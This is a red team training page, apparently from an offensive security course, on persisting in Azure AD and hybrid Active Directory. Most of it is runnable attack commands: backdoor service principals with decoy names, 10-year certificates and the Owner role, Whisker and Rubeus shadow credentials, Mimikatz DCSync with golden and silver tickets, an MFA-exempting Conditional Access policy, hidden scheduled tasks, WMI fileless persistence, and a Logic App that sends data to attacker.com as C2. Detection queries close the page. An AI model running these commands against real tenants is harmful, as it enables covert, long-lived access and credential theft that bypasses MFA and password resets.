---
layout: training-page
title: "Azure Persistence — Red Team Academy"
module: "Active Directory"
tags:
  - azure-ad
  - persistence
  - service-principal
  - oauth-apps
  - shadow-credentials
  - jwt-tampering
  - conditional-access
page_key: "ad-azure-persistence"
render_with_liquid: false
---

# Azure Persistence

Azure persistence mechanisms abuse long-lived credentials, malicious app registrations, service principal backdoors, and identity control plane misconfigurations. Unlike on-prem persistence (Golden Tickets, skeleton keys), cloud persistence focuses on OAuth tokens, certificates, and identity plane modifications that survive password resets.

## Service Principal Backdoors

Service principals with certificates or secrets can authenticate autonomously — no user interaction or MFA required. Creating a backdoor service principal with high privileges provides persistent cloud access.

### Creating a Backdoor App Registration

```bash
# Step 1: Create a new app with a convincing name
az ad app create --display-name "Azure Backup Agent" --output json

# Note the appId and id (object ID) from output

# Step 2: Create service principal for the app
az ad sp create --id "<appId>" --output json

# Note the servicePrincipalId (objectId)

# Step 3: Add a long-lived certificate credential (10-year self-signed cert)
# Generate certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 3650 -nodes \
    -subj "/CN=Azure Backup"

# Convert to PFX for Windows use
openssl pkcs12 -export -out backdoor.pfx -inkey key.pem -in cert.pem -passout pass:

# Upload the public cert to the app registration
az ad app credential reset \
    --id "<app-object-id>" \
    --cert "@cert.pem" \
    --append

# Step 4: Assign the service principal a high-privilege role
az role assignment create \
    --assignee "<servicePrincipalId>" \
    --role "Owner" \
    --scope "/subscriptions/<subscription-id>"
```

### Authenticating as the Backdoor Service Principal

```bash
# Authenticate using certificate (no password, no MFA)
az login --service-principal \
    -u "<appId>" \
    --tenant "<tenant-id>" \
    --certificate backdoor.pfx

# Get access token for Graph API
az account get-access-token --resource "https://graph.microsoft.com"

# Via PowerShell with AADInternals
Import-Module .\AADInternals.ps1
$cert = Get-PfxCertificate ".\backdoor.pfx"
Get-AADIntAccessTokenForMSGraph -Certificate $cert -ClientId "<appId>" -TenantId "<tenantId>"
```

### Adding Credentials to an Existing App (Stealthy Persistence)

Rather than creating a new app, add credentials to an existing legitimate app with high permissions:

```bash
# Find existing apps with high permissions
az ad app list --query "[?contains(requiredResourceAccess[].resourceAccess[].id, '62a82d76-70ea-41e2-9197-370581804d09')]"

# Add a new secret to existing app (stays hidden among legitimate credentials)
az ad app credential reset \
    --id "<existing-app-object-id>" \
    --append \
    --years 10

# Or add a certificate via Graph API
curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"keyCredential": {"type": "AsymmetricX509Cert", "usage": "Verify", "key": "<base64_cert>"}}' \
     "https://graph.microsoft.com/v1.0/applications/<app-object-id>/addKey"
```

---

## Implanting Custom OAuth Apps

OAuth apps with `offline_access` scope provide indefinite access via refresh tokens — even after a user's password is changed.

### Creating a Persistent OAuth Application

```bash
# Create app with API permissions for persistent access
az ad app create \
    --display-name "Microsoft Security Scanner" \
    --required-resource-accesses '[{
      "resourceAppId": "00000003-0000-0000-c000-000000000000",
      "resourceAccess": [
        {"id": "570282fd-fa5c-430d-a7fd-fc8dc98a9dca", "type": "Scope"},
        {"id": "37f7f235-527c-4136-accd-4a02d197296e", "type": "Scope"},
        {"id": "7427e0e9-2fba-42fe-b0c0-848c9e6a8182", "type": "Scope"}
      ]
    }]'
```

### Backdooring via Azure Logic Apps

Logic Apps with HTTP triggers can serve as persistent C2 endpoints that are difficult to attribute:

```json
{
  "definition": {
    "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
    "triggers": {
      "manual": {
        "type": "Request",
        "kind": "Http"
      }
    },
    "actions": {
      "Execute_Command": {
        "type": "Http",
        "inputs": {
          "method": "POST",
          "uri": "https://attacker.com/command_output",
          "body": "@{triggerBody()}"
        }
      }
    }
  }
}
```

---

## Shadow Credentials (Active Directory)

Shadow credentials abuse the `msDS-KeyCredentialLink` attribute to add an attacker-controlled certificate to a privileged account — enabling impersonation via PKINIT without the account's password.

### Attack Prerequisites

- Write access to the target's `msDS-KeyCredentialLink` attribute
- Domain-joined system with PKI (ADCS) in the environment

### Whisker — Add Shadow Credentials

```
# Check if target has existing key credentials
.\Whisker.exe list /target:"GlobalAdminUser"

# Add attacker-controlled key credential to target account
.\Whisker.exe add /target:"GlobalAdminUser"

# Output includes:
# Certificate: <base64 cert>
# Password: <pfx password>
# Rubeus command to use the cert

# Authenticate using shadow credential
.\Rubeus.exe asktgt /user:GlobalAdminUser /certificate:<base64> /password:<pfx_pass>

# This grants a TGT without knowing the user's password
```

### Shadow Credentials for Azure AD (Via AADInternals)

```
Import-Module .\AADInternals.ps1

# Add attacker-controlled key credential to an Azure AD user
# Requires: Global Admin or ability to modify user's authentication methods
Add-AADIntUserAuthenticationMethod -UserPrincipalName "victim@tenant.com" `
    -Method "KeyCredential" -KeyCredential $cert
```

### Detection

```powershell
# Detect msDS-KeyCredentialLink modifications
# Event ID 5136 (Directory Service Object Modification)
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=5136} | 
    Where-Object { $_.Message -match "msDS-KeyCredentialLink" }
```

---

## JWT Tampering

JWTs (JSON Web Tokens) are used as access tokens across Azure AD. Tampering attacks target weak signing keys or confused delegation.

### Analyzing a JWT

```python
import base64, json

def decode_jwt(token):
    parts = token.split('.')
    # Add padding
    header = json.loads(base64.b64decode(parts[0] + '=='))
    payload = json.loads(base64.b64decode(parts[1] + '=='))
    return header, payload

token = "<your_jwt_token>"
header, payload = decode_jwt(token)
print(json.dumps(payload, indent=2))
# Look for: aud, iss, oid, roles, scp, exp
```

### TokenTactics — Token Manipulation

```
Import-Module .\TokenTactics.ps1

# Refresh a token with expanded scope
Invoke-RefreshToToken -domain "victim.onmicrosoft.com" -refreshToken "<rt>"

# Upgrade refresh token to specific resource token
Invoke-RefreshToOutlookToken -domain "victim.onmicrosoft.com" -refreshToken "<rt>"
Invoke-RefreshToSharePointToken -domain "victim.onmicrosoft.com" -refreshToken "<rt>"

# Dump all cached tokens
Get-AzureTokensFromCache
```

---

## Golden and Silver Ticket Persistence (Hybrid)

Traditional Kerberos ticket attacks remain viable in hybrid environments where on-prem AD is connected to Azure AD.

### Golden Ticket — KRBTGT Hash Compromise

```
# Mimikatz — create Golden Ticket after obtaining KRBTGT hash
privilege::debug
lsadump::dcsync /user:krbtgt

# Generate Golden Ticket (valid for 10 years)
kerberos::golden /domain:victim.com /sid:S-1-5-21-XXXX /rc4:<krbtgt_hash> \
    /user:FakeAdmin /id:500 /ticket:golden.kirbi

# Load ticket and access domain resources
kerberos::ptt golden.kirbi
dir \\dc01.victim.com\c$
```

### Silver Ticket — Service Account Hash

```
# Silver Ticket for CIFS service on a target server
kerberos::golden /domain:victim.com /sid:S-1-5-21-XXXX /rc4:<computer_account_hash> \
    /user:Administrator /target:server01.victim.com /service:cifs /ticket:silver.kirbi

kerberos::ptt silver.kirbi
dir \\server01.victim.com\c$
```

---

## Malicious Conditional Access Policies

An attacker with Global Admin or Conditional Access Administrator can create CA policies that weaken security for specific accounts.

```bash
# Create a CA policy that excludes an attacker-controlled account from MFA
curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "displayName": "Emergency Access - Legacy Compatibility",
       "state": "enabled",
       "conditions": {
         "users": {
           "includeUsers": ["All"],
           "excludeUsers": ["<attacker_account_object_id>"]
         }
       },
       "grantControls": {
         "operator": "OR",
         "builtInControls": ["mfa"]
       }
     }' \
     "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"
```

---

## Scheduled Tasks and WMI (On-Prem Persistence)

Classic on-prem persistence remains relevant for hybrid environments.

```powershell
# Scheduled task persistence (survives reboots)
schtasks /create /tn "Windows Update Helper" /tr "powershell -w hidden -c IEX..." \
    /sc ONLOGON /ru SYSTEM /f

# WMI event subscription (fileless persistence)
$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name = "SystemHealthCheck"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute=0"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "ActiveScriptEventConsumer" -Arguments @{
    Name = "SystemHealthScript"
    ScriptingEngine = "VBScript"
    ScriptText = "CreateObject(""WScript.Shell"").Run ""powershell -w hidden ..."""
}

Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

---

## Detection

```
// Detect new app registration credential added
AuditLogs
| where OperationName in ("Add service principal credentials", "Update application - Certificates and secrets management")
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName

// Detect new role assignment for service principal
AuditLogs
| where OperationName == "Add app role assignment to service principal"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName

// Detect Logic App creation with HTTP trigger
AzureActivity
| where ResourceProviderValue == "MICROSOFT.LOGIC"
| where OperationNameValue contains "workflows/write"
| project TimeGenerated, Caller, Resource

// Detect Shadow Credential (msDS-KeyCredentialLink) change
SecurityEvent
| where EventID == 5136
| where Message contains "msDS-KeyCredentialLink"
| project TimeGenerated, SubjectUserName, ObjectName, AttributeValue
```

## Resources

- AADInternals — `github.com/Gerenios/AADInternals`
- Whisker (Shadow Credentials) — `github.com/eladshamir/Whisker`
- TokenTacticsV2 — `github.com/f-bader/TokenTacticsV2`
- Rubeus — `github.com/GhostPack/Rubeus`
- Azure App Registration docs — `learn.microsoft.com/en-us/entra/identity-platform/app-objects-and-service-principals`
- Azure Logic Apps — `learn.microsoft.com/en-us/azure/logic-apps/`
